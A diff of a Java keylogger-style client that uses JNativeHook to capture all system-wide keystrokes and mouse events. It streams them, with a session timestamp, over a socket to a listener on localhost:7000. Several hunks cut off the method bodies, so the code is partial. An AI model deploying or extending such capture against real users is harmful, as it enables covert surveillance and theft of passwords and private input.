@@ -9,41 +9,39 @@ import org.jnativehook.mouse.NativeMouseWheelListener;
 
 import java.io.*;
 import java.net.*;
+import java.util.Date;
+import java.text.SimpleDateFormat;
 
 public class Client extends Thread implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener {
-
+    
     private static FileWriter filewriter;
     private static BufferedWriter bufferedWriter;
     private static ObjectOutputStream objectOutputStream;
-/*
-    public static void main(String[] args) throws NativeHookException, IOException {
-
-        Socket socket = new Socket("localhost", 2000);
-        objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
-        GlobalScreen.registerNativeHook();
-        GlobalScreen.addNativeKeyListener(new Client());
-        GlobalScreen.addNativeMouseListener(new Client());
-        GlobalScreen.addNativeMouseMotionListener(new Client());
-        GlobalScreen.addNativeMouseWheelListener(new Client());
-
+    
+    public void stopClient(){
+        System.out.println("from client ending");
+        System.exit(0);
     }
-*/
 
     public void run() {
         try {
             Socket socket = new Socket("localhost", 7000);
             objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
+            SimpleDateFormat df=new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");  
+            Date date = new Date();
+            objectOutputStream.writeUTF("New session started at: "+df.format(date)+"\n");
             GlobalScreen.registerNativeHook();
             GlobalScreen.addNativeKeyListener(new Client());
             GlobalScreen.addNativeMouseListener(new Client());
             GlobalScreen.addNativeMouseMotionListener(new Client());
             GlobalScreen.addNativeMouseWheelListener(new Client());
+            
         } catch (Exception e) {
             System.out.println(e);
         }
     }
-
-
+    
+    
     //native event listeners
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
@@ -60,7 +58,7 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
             System.out.println(f);
         }
     }
-
+    
     /*
     This method records all the pressed keys
     */
@@ -71,13 +69,13 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
         } catch (IOException f) {
             System.out.println(f);
         }
-
+        
     }
-
+    
     //qwerty
- /*
- This method records all the released keys
- */
+    /*
+    This method records all the released keys
+    */
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
         try {
@@ -85,13 +83,13 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
         } catch (IOException f) {
             System.out.println(f);
         }
-
+        
     }
-
+    
     @Override
     public void nativeMouseClicked(NativeMouseEvent nativeMouseEvent) {
     }
-
+    
     /*
     This method records all the mouse clicks
     */
@@ -103,7 +101,7 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
             e.printStackTrace();
         }
     }
-
+    
     /*
     This method records all the mouse button released events
     */
@@ -115,7 +113,7 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
             e.printStackTrace();
         }
     }
-
+    
     /*
     This method records all the mouse move coordinates
     */
@@ -127,7 +125,7 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
             e.printStackTrace();
         }
     }
-
+    
     /*
     This method records all the mouse dragged coordinates
     */
@@ -139,9 +137,9 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
             e.printStackTrace();
         }
     }
-
+    
     /* This method records all the mouse wheel moves, direction of the move and scroll amount lol
-     */
+    */
     @Override
     public void nativeMouseWheelMoved(NativeMouseWheelEvent nativeMouseWheelEvent) {
         try {
@@ -160,7 +158,7 @@ public class Client extends Thread implements NativeKeyListener, NativeMouseInpu
             e.printStackTrace();
         }
     }
-
-
-
+    
+    
+    
 }
